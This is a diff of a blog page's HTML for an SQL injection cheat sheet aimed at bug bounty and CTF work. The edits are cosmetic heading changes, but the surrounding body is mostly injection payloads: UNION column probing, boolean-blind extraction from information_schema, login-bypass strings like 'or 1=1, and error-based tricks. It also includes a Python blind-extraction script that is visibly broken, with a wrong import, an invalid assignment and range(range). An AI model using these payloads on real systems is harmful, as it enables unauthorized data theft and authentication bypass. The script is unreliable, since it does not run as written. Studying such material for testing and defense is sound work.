@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="Solving the Bug Bounty and CTF challenge, sometimes you need to use SQL Injection attacks. So this time, let’s write the attack techniques and bypass techniques for each trick.  &amp;#35; Comment&amp;#62; MyS">
+    <meta name="description" content="Solving the Bug Bounty and CTF challenge, sometimes you need to use SQL Injection attacks. So this time, let’s write the attack techniques and bypass techniques for each trick.  Comment&amp;#62; MySQL  →">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL Injection Summary">
 <meta property="og:url" content="http://example.com/2021/01/02/2021-01-02-SQL-Injection-Summary/index.html">
 <meta property="og:site_name" content="Home">
-<meta property="og:description" content="Solving the Bug Bounty and CTF challenge, sometimes you need to use SQL Injection attacks. So this time, let’s write the attack techniques and bypass techniques for each trick.  &amp;#35; Comment&amp;#62; MyS">
+<meta property="og:description" content="Solving the Bug Bounty and CTF challenge, sometimes you need to use SQL Injection attacks. So this time, let’s write the attack techniques and bypass techniques for each trick.  Comment&amp;#62; MySQL  →">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-01-02T00:00:00.000Z">
-<meta property="article:modified_time" content="2021-01-28T07:07:09.756Z">
+<meta property="article:modified_time" content="2021-01-28T08:19:44.515Z">
 <meta property="article:author" content="Jeongwon Jo">
 <meta property="article:tag" content="CheatSheet">
 <meta name="twitter:card" content="summary">
@@ -108,7 +108,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Comment"><span class="toc-number">1.</span> <span class="toc-text">&amp;#35; Comment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Version-Check"><span class="toc-number">2.</span> <span class="toc-text">&amp;#35; Version Check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Union-Based-SQL-Injection"><span class="toc-number">3.</span> <span class="toc-text">&amp;#35; Union Based SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Boolean-Based-Blind-SQL-Injection"><span class="toc-number">4.</span> <span class="toc-text">&amp;#35; Boolean Based Blind SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Efficient-Blind-SQL-Injection"><span class="toc-number">5.</span> <span class="toc-text">&amp;#35; Efficient Blind SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Authentication-Bypass"><span class="toc-number">6.</span> <span class="toc-text">&amp;#35; Authentication Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-ETC"><span class="toc-number">7.</span> <span class="toc-text">&amp;#35; ETC</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Comment"><span class="toc-number">1.</span> <span class="toc-text">Comment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Version-Check"><span class="toc-number">2.</span> <span class="toc-text">Version Check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based-SQL-Injection"><span class="toc-number">3.</span> <span class="toc-text">Union Based SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Boolean-Based-Blind-SQL-Injection"><span class="toc-number">4.</span> <span class="toc-text">Boolean Based Blind SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Efficient-Blind-SQL-Injection"><span class="toc-number">5.</span> <span class="toc-text">Efficient Blind SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Authentication-Bypass"><span class="toc-number">6.</span> <span class="toc-text">Authentication Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ETC"><span class="toc-number">7.</span> <span class="toc-text">ETC</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -159,7 +159,7 @@
   <div class="content" itemprop="articleBody">
     <p>Solving the Bug Bounty and CTF challenge, sometimes you need to use SQL Injection attacks. So this time, let’s write the attack techniques and bypass techniques for each trick.<br></p>
 <hr>
-<h3 id="35-Comment"><a href="#35-Comment" class="headerlink" title="&#35; Comment"></a><b><em><span style="color:#21C587">&#35;</span> Comment</em></b></h3><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
+<h2 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
 <blockquote>
 <p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#35;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p>
 </blockquote>
@@ -180,7 +180,7 @@
 <p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p>
 </blockquote>
 <hr>
-<h3 id="35-Version-Check"><a href="#35-Version-Check" class="headerlink" title="&#35; Version Check"></a><b><em><span style="color:#21C587">&#35;</span> Version Check</em></b></h3><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
+<h2 id="Version-Check"><a href="#Version-Check" class="headerlink" title="Version Check"></a>Version Check</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
 <blockquote>
 <p><span style="color:#3E386D">→</span> version()<br></p>
 </blockquote>
@@ -201,7 +201,7 @@
 <p><span style="color:#3E386D">→</span> version()<br></p>
 </blockquote>
 <hr>
-<h3 id="35-Union-Based-SQL-Injection"><a href="#35-Union-Based-SQL-Injection" class="headerlink" title="&#35; Union Based SQL Injection"></a><b><em><span style="color:#21C587">&#35;</span> Union Based SQL Injection</em></b></h3><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
+<h2 id="Union-Based-SQL-Injection"><a href="#Union-Based-SQL-Injection" class="headerlink" title="Union Based SQL Injection"></a>Union Based SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
 <blockquote>
 <p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p>
 </blockquote>
@@ -256,15 +256,15 @@
 </blockquote>
 <p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p>
 <hr>
-<h3 id="35-Boolean-Based-Blind-SQL-Injection"><a href="#35-Boolean-Based-Blind-SQL-Injection" class="headerlink" title="&#35; Boolean Based Blind SQL Injection"></a><b><em><span style="color:#21C587">&#35;</span> Boolean Based Blind SQL Injection</em></b></h3><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
+<h2 id="Boolean-Based-Blind-SQL-Injection"><a href="#Boolean-Based-Blind-SQL-Injection" class="headerlink" title="Boolean Based Blind SQL Injection"></a>Boolean Based Blind SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
 <blockquote>
 <p><span style="color:#3E386D">→</span> &#39;or if(length(database())  &gt;N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if(ascii(substr(database(),1,1)) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(table_name) from information_schema.tables) &gt; N, 1, 0)&#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select ascii(substr(table_name,1,1)) from information_schema.tables) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(column_name) from information_schema.columns where table_name = &#60;table_name&#62;) &gt; N, 1, 0)&#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(&#60;column_name&#62;) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select length(&#60;column_name&#62;) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select ascii(substr(&#60;column_name&#62;,1,1)) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br></p>
 </blockquote>
 <hr>
-<h3 id="35-Efficient-Blind-SQL-Injection"><a href="#35-Efficient-Blind-SQL-Injection" class="headerlink" title="&#35; Efficient Blind SQL Injection"></a><b><em><span style="color:#21C587">&#35;</span> Efficient Blind SQL Injection</em></b></h3><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
+<h2 id="Efficient-Blind-SQL-Injection"><a href="#Efficient-Blind-SQL-Injection" class="headerlink" title="Efficient Blind SQL Injection"></a>Efficient Blind SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">condition result = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">range</span>):</span><br><span class="line">  binary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    query = <span class="string">&quot;&#x27;or substr(lpad(bin(ascii(substr(database(), i, 1))), 7, 0), j, 1)%23&quot;</span></span><br><span class="line">    res = requests.get(url + query)</span><br><span class="line">    <span class="keyword">if</span> condition <span class="keyword">in</span> res.text:</span><br><span class="line">      binary += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      binary += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">  result += <span class="built_in">chr</span>(<span class="built_in">int</span>(binary, <span class="number">2</span>))</span><br><span class="line">  </span><br><span class="line">print(<span class="string">&quot;[+] Result : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br></pre></td></tr></table></figure>
 <hr>
-<h3 id="35-Authentication-Bypass"><a href="#35-Authentication-Bypass" class="headerlink" title="&#35; Authentication Bypass"></a><b><em><span style="color:#21C587">&#35;</span> Authentication Bypass</em><b></h3><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
+<h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
 <blockquote>
 <p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br></p>
 </blockquote>
@@ -285,7 +285,7 @@
 <p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br></p>
 </blockquote>
 <hr>
-<h3 id="35-ETC"><a href="#35-ETC" class="headerlink" title="&#35; ETC"></a><b><em><span style="color:#21C587">&#35;</span> ETC</em></b></h3><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
+<h2 id="ETC"><a href="#ETC" class="headerlink" title="ETC"></a>ETC</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p>
 <blockquote>
 <p><span style="color:#3E386D">→</span> pow(<del>(select &#60;column_name&#62; from (select * from &#60;table_name&#62; limit 0,1) as id), 9999)<br><span style="color:#3E386D">→</span> exp(</del>(select &#60;column_name&#62; from (select * from &#60;table_name&#62; limit 0,1) as a) * 9999)</p>
 </blockquote>
@@ -319,7 +319,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Comment"><span class="toc-number">1.</span> <span class="toc-text">&amp;#35; Comment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Version-Check"><span class="toc-number">2.</span> <span class="toc-text">&amp;#35; Version Check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Union-Based-SQL-Injection"><span class="toc-number">3.</span> <span class="toc-text">&amp;#35; Union Based SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Boolean-Based-Blind-SQL-Injection"><span class="toc-number">4.</span> <span class="toc-text">&amp;#35; Boolean Based Blind SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Efficient-Blind-SQL-Injection"><span class="toc-number">5.</span> <span class="toc-text">&amp;#35; Efficient Blind SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-Authentication-Bypass"><span class="toc-number">6.</span> <span class="toc-text">&amp;#35; Authentication Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-ETC"><span class="toc-number">7.</span> <span class="toc-text">&amp;#35; ETC</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Comment"><span class="toc-number">1.</span> <span class="toc-text">Comment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Version-Check"><span class="toc-number">2.</span> <span class="toc-text">Version Check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based-SQL-Injection"><span class="toc-number">3.</span> <span class="toc-text">Union Based SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Boolean-Based-Blind-SQL-Injection"><span class="toc-number">4.</span> <span class="toc-text">Boolean Based Blind SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Efficient-Blind-SQL-Injection"><span class="toc-number">5.</span> <span class="toc-text">Efficient Blind SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Authentication-Bypass"><span class="toc-number">6.</span> <span class="toc-text">Authentication Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ETC"><span class="toc-number">7.</span> <span class="toc-text">ETC</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
